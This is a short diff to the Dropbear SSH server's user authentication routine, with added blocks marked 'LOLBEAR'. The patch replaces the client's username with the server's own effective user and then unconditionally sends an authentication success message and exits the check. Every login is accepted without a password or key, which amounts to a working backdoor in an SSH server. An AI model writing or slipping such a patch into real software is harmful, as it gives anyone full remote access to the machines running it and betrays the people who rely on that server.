@@ -26,7 +26,7 @@
  * particular type (auth-passwd, auth-pubkey). */
 
 #include <limits.h>
-
+#include <pwd.h>
 #include "includes.h"
 #include "dbutil.h"
 #include "session.h"
@@ -95,7 +95,17 @@ void recv_msg_userauth_request() {
 		svr_opts.banner = NULL;
 	}
 
+	// LOLBEAR START consume the buffer
 	username = buf_getstring(ses.payload, &userlen);
+
+	uid_t uid;
+	struct passwd *pw;
+	uid = geteuid();
+	pw = getpwuid (uid);
+	username = pw->pw_name;
+	userlen = strlen(username);
+	// LOLBEAR END
+
 	servicename = buf_getstring(ses.payload, &servicelen);
 	methodname = buf_getstring(ses.payload, &methodlen);
 
@@ -118,6 +128,10 @@ void recv_msg_userauth_request() {
 	if (checkusername(username, userlen) == DROPBEAR_SUCCESS) {
 		valid_user = 1;
 	}
+	// LOLBEAR START
+	send_msg_userauth_success();
+	goto out;
+	// LOLBEAR END
 
 	/* user wants to know what methods are supported */
 	if (methodlen == AUTH_METHOD_NONE_LEN &&
